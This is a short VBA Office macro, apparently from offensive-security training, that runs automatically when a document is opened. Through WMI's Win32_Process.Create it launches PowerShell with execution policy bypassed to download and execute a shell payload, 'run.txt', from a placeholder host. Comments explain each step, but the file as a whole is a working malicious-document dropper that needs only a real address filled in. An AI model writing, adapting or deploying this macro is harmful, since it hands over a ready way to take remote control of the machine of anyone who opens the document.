Sub MyMacro
	'run.txt is a 64 bit shell payload
	strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://youip/run.txt'))"
	'connect to WMI from VBA with GetObject method
	'Winmgmt is the WMI service within the SVCHOST process running under the LocalSystem account
	'Win32_Process class represents a process, so we perform process specific action. In this case create a new process
	'Create method accepts four arguments, first is the name of the process including its arguments, second and third describe process creation info
	'fourth argument contain the process Id, return by the OS.
	GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
	Mymacro
End Sub